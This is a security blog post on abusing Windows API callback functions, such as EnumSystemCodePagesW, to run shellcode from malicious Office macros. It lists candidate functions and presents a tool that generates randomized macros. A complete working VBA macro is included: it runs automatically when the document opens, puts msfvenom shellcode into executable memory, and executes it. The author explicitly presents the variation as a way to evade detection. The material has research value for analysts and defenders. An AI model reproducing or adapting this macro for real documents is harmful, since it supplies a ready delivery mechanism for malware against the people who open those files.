# http://ropgadget.com/posts/abusing_win_functions.html

- [root@ropgadget\[.\]com:~#](http://ropgadget.com/index.html)
- [\_Zmain](http://ropgadget.com/main.html)
- [disass](http://ropgadget.com/about.html)
- [.Sections](http://ropgadget.com/sections.html)
- [PLT](http://ropgadget.com/links.html)
- [MvC2](http://ropgadget.com/mvc2.html)

/\\* CAT(1) \*/


[17JAN2017 - Abusing native Windows functions for shellcode execution](http://ropgadget.com/posts/abusing_win_functions.html)

By [Jeff White](https://www.linkedin.com/in/jeff-white-459a6416/) [(karttoon)](https://twitter.com/noottrak)

I've been doing a lot of analysis on malicious docs (maldocs) lately and, among a popular variant circulating right now, is a technique that I found particularly interesting. Effectively, it abuses native Windows function calls to transfer execution to shellcode that it loads into memory. I thought it was cool in this context, and not something that I was super familiar with, even though I've since learned it's a very old technique, so I set out to do some research in identifying additional functions that could be abused in a similar way and how to leverage them.

To give you an idea of how this works, I'll go over a quick example of how shellcode can be executed through a function. For this, I'll use [EnumResourceTypesA](https://msdn.microsoft.com/en-us/library/windows/desktop/ms648039(v=vs.85).aspx).

EnumResourceTypesA(
\_\_in\_opt HMODULE hModule,
\_\_in ENUMRESTYPEPROCA lpEnumFunc,
\_\_in LONG\_PTR lParam
);

As stated by Microsoft, this function "enumerates resource types within a binary module" and the second argument, the interesting bit, is "a pointer to the callback function to be called for each enumerated resource type". If I supply the memory address of the shellcode to lpEnumFunc, it will pass each enumerated resource to that function but, since it's the shellcode, it just executes whatever is at the memory address I provided - keep in mind the memory page still needs to allow for code execution.

In the context of maldocs, VBA gives you the capabilities to directly call Windows functions yet, outside of VBA, these functions can also be leveraged during typical exploitation attacks if you know the target application already has the function imported. You could possibly save ROP chain space that might typically be used for certain gadgets that carry out like functionality as well, depending on the function and required arguements. In addition, from a general offsec perspective, if you continue using the same function calls for your maldocs, you leave a very clear pattern of dynamic and static artifacts that make it trivial to track and detect, so it's nice to have the option of mixing things up a bit. As the saying goes, variety is the spice of life!

To enumerate all of the possible functions, I looked at the C header files that come in the Windows 7 x86 SDK.

$ cat \*.h \|tr '\\r\\n' ' ' \|tr ';' '\\n' \|sed -e 's/--//g' -e 's/ / /g' \|grep -iE "\_\_in.+(Func\|Proc\|CallBack\| lpfn\| lpproc)," \|grep -oE " \[a-zA-Z\]+\\(\[a-zA-Z0-9\*\_, \]+\\)" \|grep "\_\_in" \|cut -d"(" -f1 \|sort -u \|sed -e 's/^ //g'

The meat of it is the grep for '(Func\|Proc\|CallBack\| lpfn\| lpproc)', the rest is mainly attempting to normalize the header file function structures for easier parsing since they were all over the place in terms of style.

After getting a list of candidate functions, I set out testing each one to try and figure out which would be the most likely to be used in maldocs. This equated to me reading the MSDN article to understand the purpose of the function and then a few quick lines of VBA to see if I could get it working. While most of these can most likely be massaged into executing code at your specified address, there isn't a lot of reward in chaining together multiple functions to do so with the abundance of "easy" ones. For example, the DestroyCluster function has a similar callback argument, but you'd have to also call CreateCluster and OpenCluster to setup the environment first, which is a bit much for the usecase.

The below table lists the identified functions which appeared to have the ability to accept a memory address for code execution and may be open to possible abuse.

|     |     |     |
| --- | --- | --- |
| AddClusterNode | BluetoothRegisterForAuthentication | CMTranslateRGBsExt |
| CallWindowProcA | CallWindowProcW | CreateCluster |
| CreateDialogIndirectParamA | CreateDialogIndirectParamW | CreateDialogParamA |
| CreateDialogParamW | CreatePrintAsyncNotifyChannel | CreateTimerQueueTimer |
| DavRegisterAuthCallback | DbgHelpCreateUserDump | DbgHelpCreateUserDumpW |
| DdeInitializeA | DdeInitializeW | DestroyCluster |
| DialogBoxIndirectParamA | DialogBoxIndirectParamW | DialogBoxParamA |
| DialogBoxParamW | DirectSoundCaptureEnumerateA | DirectSoundCaptureEnumerateW |
| DirectSoundEnumerateA | DirectSoundEnumerateW | DrawStateA |
| DrawStateW | EnumCalendarInfoA | EnumCalendarInfoW |
| EnumChildWindows | EnumDateFormatsA | EnumDateFormatsW |
| EnumDesktopWindows | EnumDesktopsA | EnumDesktopsW |
| EnumEnhMetaFile | EnumFontFamiliesA | EnumFontFamiliesExA |
| EnumFontFamiliesExW | EnumFontFamiliesW | EnumFontsA |
| EnumFontsW | EnumICMProfilesA | EnumICMProfilesW |
| EnumLanguageGroupLocalesA | EnumLanguageGroupLocalesW | EnumMetaFile |
| EnumObjects | EnumPropsExA | EnumPropsExW |
| EnumPwrSchemes | EnumResourceLanguagesA | EnumResourceLanguagesExA |
| EnumResourceLanguagesExW | EnumResourceLanguagesW | EnumResourceNamesA |
| EnumResourceNamesExA | EnumResourceNamesExW | EnumResourceNamesW |
| EnumResourceTypesA | EnumResourceTypesW | EnumResourceTypesExA |
| EnumResourceTypesExW | EnumResourceTypesW | EnumSystemCodePagesA |
| EnumSystemCodePagesW | EnumSystemLanguageGroupsA | EnumSystemLanguageGroupsW |
| EnumSystemLocalesA | EnumSystemLocalesW | EnumThreadWindows |
| EnumTimeFormatsA | EnumTimeFormatsW | EnumUILanguagesA |
| EnumUILanguagesW | EnumWindowStationsA | EnumWindowStationsW |
| EnumWindows | EnumerateLoadedModules | EnumerateLoadedModulesEx |
| EnumerateLoadedModulesExW | EventRegister | GetApplicationRecoveryCallback |
| GrayStringA | GrayStringW | KsCreateFilterFactory |
| KsMoveIrpsOnCancelableQueue | KsStreamPointerClone | KsStreamPointerScheduleTimeout |
| LineDDA | MFBeginRegisterWorkQueueWithMMCSS | MFBeginUnregisterWorkQueueWithMMCSS |
| MFPCreateMediaPlayer | MQReceiveMessage | MQReceiveMessageByLookupId |
| NotifyIpInterfaceChange | NotifyStableUnicastIpAddressTable | NotifyTeredoPortChange |
| NotifyUnicastIpAddressChange | PerfStartProvider | PlaExtractCabinet |
| ReadEncryptedFileRaw | RegisterApplicationRecoveryCallback | RegisterForPrintAsyncNotifications |
| RegisterServiceCtrlHandlerExA | RegisterServiceCtrlHandlerExW | RegisterWaitForSingleObject |
| RegisterWaitForSingleObjectEx | SHCreateThread | SHCreateThreadWithHandle |
| SendMessageCallbackA | SendMessageCallbackW | SetTimerQueueTimer |
| SetWinEventHook | SetWindowsHookExA | SetWindowsHookExW |
| SetupDiRegisterDeviceInfo | SymEnumLines | SymEnumLinesW |
| SymEnumProcesses | SymEnumSourceLines | SymEnumSourceLinesW |
| SymEnumSymbols | SymEnumSymbolsForAddr | SymEnumSymbolsForAddrW |
| SymEnumSymbolsW | SymEnumTypes | SymEnumTypesByName |
| SymEnumTypesByNameW | SymEnumTypesW | SymEnumerateModules |
| SymEnumerateModules64 | SymEnumerateSymbols | SymEnumerateSymbols64 |
| SymEnumerateSymbolsW | SymSearch | SymSearchW |
| TranslateBitmapBits | WPUQueryBlockingCallback | WdsCliTransferFile |
| WdsCliTransferImage | WinBioCaptureSampleWithCallback | WinBioEnrollCaptureWithCallback |
| WinBioIdentifyWithCallback | WinBioLocateSensorWithCallback | WinBioRegisterEventMonitor |
| WinBioVerifyWithCallback | WlanRegisterNotification | WriteEncryptedFileRaw |
| WsPullBytes | WsPushBytes | WsReadEnvelopeStart |
| WsRegisterOperationForCancel | WsWriteEnvelopeStart | mciSetYieldProc |
| midiInOpen | midiOutOpen | mixerOpen |
| mmioInstallIOProcA | mmioInstallIOProcW | waveInOpen |
| waveOutOpen |

Out of that list, I was able to get the 49 functions, highlighted in red, to execute basic Calc shellcode with little to no additional interaction. At most, I had to provide some unique data, such as a handle to a process or specific values, but for the most part they are standalone and accept a 0 or 1 as values to every other argument the function needs.

I wrapped all of this into a small little script I'm calling trigen (think 3 combo-generator) which randomly puts together a VBA macro using API calls from pools of functions for allocating memory (4 total), copying shellcode to memory (2 total), and then finally abusing the Win32 function call to get code execution (48 total - I left SetWinEventHook out due to aforementioned need to chain functions). In total, there are 384 different possible macro combinations that it can spit out.

The tool can be downloaded from [here](https://github.com/karttoon/trigen) and will generate output similar to the below. It takes one argument, which is the hex-string of the shellcode, but it will do some minimal parsing of msfvenom output too (C or Py).

\# python trigen.py "$(msfvenom --payload windows/exec CMD='calc.exe' -f c)"
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 193 bytes

################################################
\# #
\# Copy VBA to Microsoft Office 97-2003 DOC #
\# #
\# Alloc: HeapAlloc #
\# Write: RtlMoveMemory #
\# ExeSC: EnumSystemCodePagesW #
\# #
################################################

Private Declare Function createMemory Lib "kernel32" Alias "HeapCreate" (ByVal flOptions As Long, ByVal dwInitialSize As Long, ByVal dwMaximumSize As Long) As Long
Private Declare Function allocateMemory Lib "kernel32" Alias "HeapAlloc" (ByVal hHeap As Long, ByVal dwFlags As Long, ByVal dwBytes As Long) As Long
Private Declare Sub copyMemory Lib "ntdll" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal ByteLen As Long)
Private Declare Function shellExecute Lib "kernel32" Alias "EnumSystemCodePagesW" (ByVal lpCodePageEnumProc As Any, ByVal dwFlags As Any) As Long

Private Sub Document\_Open()

Dim shellCode As String
Dim shellLength As Byte
Dim byteArray() As Byte
Dim memoryAddress As Long
Dim zL As Long
zL = 0
Dim rL As Long

shellCode = "fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6a018d85b20000005068318b6f87ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd563616c632e65786500"

shellLength = Len(shellCode) / 2
ReDim byteArray(0 To shellLength)

For i = 0 To shellLength - 1

If i = 0 Then
pos = i + 1
Else
pos = i \* 2 + 1
End If
Value = Mid(shellCode, pos, 2)
byteArray(i) = Val("&H" & Value)

Next

rL = createMemory(&H40000, zL, zL)
memoryAddress = allocateMemory(rL, zL, &H5000)

copyMemory ByVal memoryAddress, byteArray(0), UBound(byteArray) + 1

executeResult = shellExecute(memoryAddress, zL)

End Sub

The logic of the code is fairly straight forward. Allocate memory, copy shellcode into memory, transfer execution to the shellcode via abused function call. The script will include the necessary code for each part.

I'm also including the VBA I worked from as I went through my testing, which has some notes and other tidbits. Feel free to experiment with that or pick up where I left off.

Cheers!

[Older posts...](http://ropgadget.com/sections.html)